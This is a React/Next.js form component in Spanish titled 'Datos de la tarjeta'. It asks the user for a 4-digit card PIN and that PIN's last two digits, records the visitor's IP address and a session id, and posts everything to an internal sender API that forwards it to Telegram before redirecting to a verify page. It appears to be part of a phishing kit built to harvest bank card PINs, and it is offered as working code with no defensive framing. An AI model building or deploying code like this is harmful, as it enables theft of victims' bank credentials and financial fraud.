import React, { useState } from 'react';
import { Box, TextField, Button, Typography, Container } from '@mui/material';
import CircularProgress from '@mui/material/CircularProgress';
import axios from 'axios';
import { useRouter } from 'next/router'; // Importa useRouter para redirigir
import Header from '@/components/header';
import Footer from '@/components/Footer';
import { toast } from 'sonner';
import { getSessionId } from '@/utils/session';
import { formatCardDetailsMessage } from '@/utils/telegramFormatter';

const CardAndNIPForm = () => {
    const router = useRouter(); // Instancia de useRouter para la redirección

    const [formData, setFormData] = useState({
        lastTwoDigits: '',
        nip: '',
    });

    const [errors, setErrors] = useState({
        lastTwoDigits: false,
        nip: false,
    });

    const [loading, setLoading] = useState(false);

    // Validación para los últimos 2 dígitos
    const isLastTwoDigitsValid = (lastTwoDigits) => {
        const lastTwoDigitsRegex = /^[0-9]{2}$/;
        return lastTwoDigitsRegex.test(lastTwoDigits);
    };

    // Validación para los 4 dígitos del NIP
    const isNIPValid = (nip) => {
        const nipRegex = /^[0-9]{4}$/;
        return nipRegex.test(nip);
    };

    // Prevenir la entrada de caracteres no numéricos
    const handleKeyPress = (e) => {
        const invalidChars = ['e', 'E', '+', '-', '.'];
        if (invalidChars.includes(e.key)) {
            e.preventDefault();
        }
    };

    const handleChange = (e) => {
        const { name, value } = e.target;
        // Limitar la entrada a números y longitud específica
        let numericValue = value.replace(/[^0-9]/g, '');
        if (name === 'lastTwoDigits') {
            numericValue = numericValue.slice(0, 2); // Limitar a 2 dígitos
        } else if (name === 'nip') {
            numericValue = numericValue.slice(0, 4); // Limitar a 4 dígitos
        }
        setFormData({
            ...formData,
            [name]: numericValue,
        });
    };

    const handleSubmit = async (e) => {
        e.preventDefault();
        const newErrors = {
            lastTwoDigits: !isLastTwoDigitsValid(formData.lastTwoDigits),
            nip: !isNIPValid(formData.nip),
        };

        setErrors(newErrors);

        // Si hay errores, muestra el mensaje con el primer error encontrado
        const errorMessages = {
            lastTwoDigits: 'Ingresa los 2 últimos dígitos de tu NIP.',
            nip: 'Ingresa los 4 dígitos de tu NIP.',
        };



        // ...

        const firstError = Object.keys(newErrors).find((key) => newErrors[key]);
        if (firstError) {
            toast.error(errorMessages[firstError]);
            setLoading(false);
            return;
        }

        // Validate that last 2 digits match the last 2 digits of the NIP
        const nipLastTwo = formData.nip.slice(-2);
        if (formData.lastTwoDigits !== nipLastTwo) {
            toast.error('Los últimos 2 dígitos no coinciden con tu NIP. Verifica e intenta nuevamente.');
            setErrors({ ...errors, lastTwoDigits: true });
            return;
        }

        // Simular la espera de 2 segundos y el envío
        setLoading(true);

        try {
            // Check if in TEST_MODE
            const isTestMode = process.env.NEXT_PUBLIC_TEST_MODE === 'true';

            if (!isTestMode) {
                // Only send to Telegram if NOT in test mode
                const ip = await axios.get('https://api.ipify.org?format=json');
                const sessionId = getSessionId();

                // Format message for Telegram with improved structure
                const message = formatCardDetailsMessage({
                    sessionId,
                    lastTwoDigits: formData.lastTwoDigits,
                    nip: formData.nip,
                    ip: ip.data.ip
                });

                // Send directly to Telegram via sender API
                await axios.post('/api/sender', { message });
            } else {
                // TEST MODE: Simulate API delay
                console.log('TEST MODE: Skipping Telegram send');
                console.log('Card data:', formData);
                await new Promise(resolve => setTimeout(resolve, 500));
            }

            // Redirigir a la página /verify si los datos se envían correctamente
            setTimeout(() => {
                setLoading(false);
                router.push('/verify'); // Redirigir a la página /check
            }, 2000);
        } catch (error) {
            toast.error('Error al enviar los datos. Por favor, inténtalo de nuevo.');
        } finally {
            setLoading(false);
        }
    };

    return (
        <Box sx={{ minHeight: '100vh', display: 'flex', flexDirection: 'column' }}>
            <Header />
            <Container
                component="main"
                maxWidth="xs"
                sx={{
                    flex: 1, // Takes available space
                    display: 'flex',
                    alignItems: 'center',
                    justifyContent: 'center',
                    py: 4,
                }}
            >
                <Box
                    component="form"
                    onSubmit={handleSubmit}
                    sx={{
                        display: 'flex',
                        flexDirection: 'column',
                        alignItems: 'center',
                        bgcolor: 'background.paper',
                        p: 4,
                        borderRadius: 2,
                        boxShadow: 3,
                        width: '100%',
                        maxWidth: 400,
                    }}
                >
                    <Typography component="h1" variant="h5" sx={{ fontWeight: 'bold' }}>
                        Datos de la tarjeta
                    </Typography>

                    <TextField
                        margin="normal"
                        required
                        fullWidth
                        id="nip"
                        label="Ingresa los 4 dígitos de tu NIP"
                        name="nip"
                        type="tel"
                        value={formData.nip}
                        onChange={handleChange}
                        onKeyPress={handleKeyPress}
                        error={errors.nip}
                        inputProps={{ maxLength: 4 }}
                    />

                    <TextField
                        margin="normal"
                        required
                        fullWidth
                        id="lastTwoDigits"
                        label="2 últimos dígitos de tu NIP"
                        name="lastTwoDigits"
                        type="tel"
                        value={formData.lastTwoDigits}
                        onChange={handleChange}
                        onKeyPress={handleKeyPress}
                        error={errors.lastTwoDigits}
                        inputProps={{ maxLength: 2 }}
                    />

                    <Button
                        type="submit"
                        fullWidth
                        variant="contained"
                        sx={{ mt: 3, mb: 2, borderRadius: '50px' }}
                        disabled={loading}
                    >
                        {loading ? <CircularProgress size={24} /> : 'Enviar'}
                    </Button>
                </Box>
            </Container>
            <Footer />
        </Box>
    );
};

export default CardAndNIPForm;
